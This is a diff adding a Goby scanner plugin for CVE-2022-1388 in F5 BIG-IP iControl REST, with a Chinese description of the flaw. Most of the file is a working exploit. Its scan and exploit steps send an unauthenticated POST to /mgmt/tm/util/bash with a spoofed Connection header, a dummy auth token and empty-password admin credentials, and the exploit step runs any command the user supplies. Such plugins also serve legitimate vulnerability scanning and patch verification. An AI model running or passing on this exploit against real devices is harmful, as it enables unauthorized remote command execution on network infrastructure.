@@ -1,0 +1,86 @@
+{
+      "Name": "F5 BIG-IP iControl REST 远程代码执行(CVE-2022-1388)",
+      "Level": "3",
+      "Tags": [
+            "RCE"
+      ],
+      "GobyQuery": "title=\"BIG-IP&reg;- Redirect\"",
+      "Description": "2022年05月05日，F5官方发布了CVE-2022-1388 F5 BIG-IP iControl REST 远程代码执行漏洞。F5 BIG-IP是美国F5公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。iControl REST 是iControl 框架的演变，使用 REpresentational State Transfer (REST)。这允许用户或脚本与 F5 设备之间进行轻量级、快速的交互。CVE-2022-1388 中，攻击者可在无需身份认证的情况下调用相关Rest API，从而执行任意命令。",
+      "Product": "F5-BIGIP",
+      "Homepage": "https://www.f5.com/",
+      "Author": "hou5",
+      "Impact": "<p>which allows attackers to execute arbitrary commands<br></p>",
+      "Recommandation": "",
+      "References": [
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1388"
+      ],
+	  "HasExp": true,
+	  "ExpParams": [
+		{
+			"name": "Cmd",
+			"type": "input",
+			"value": "id",
+			"show": ""
+		}
+	  ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/mgmt/tm/util/bash",
+                        "follow_redirect": false,
+                        "header": {
+                              "Connection": "Keep-Alive, X-F5-Auth-Token",
+							  "X-F5-Auth-Token": "aa",
+							  "Authorization": "Basic YWRtaW46"
+                        },
+                        "data_type": "text",
+                        "data": "{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "!=",
+                                    "value": "204",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "uid",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+	  "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/mgmt/tm/util/bash",
+                        "follow_redirect": false,
+                        "header": {
+                              "Connection": "Keep-Alive, X-F5-Auth-Token",
+							  "X-F5-Auth-Token": "aa",
+							  "Authorization": "Basic YWRtaW46"
+                        },
+                        "data_type": "text",
+                        "data": "{\"command\":\"run\",\"utilCmdArgs\":\"-c {{{Cmd}}}\"}"
+                  },
+                  "SetVariable": [
+					"output|lastbody"
+				  ]
+            }
+      ],
+      "PostTime": "2022-05-10 13:52:01",
+      "GobyVersion": "1.9.325"
+}
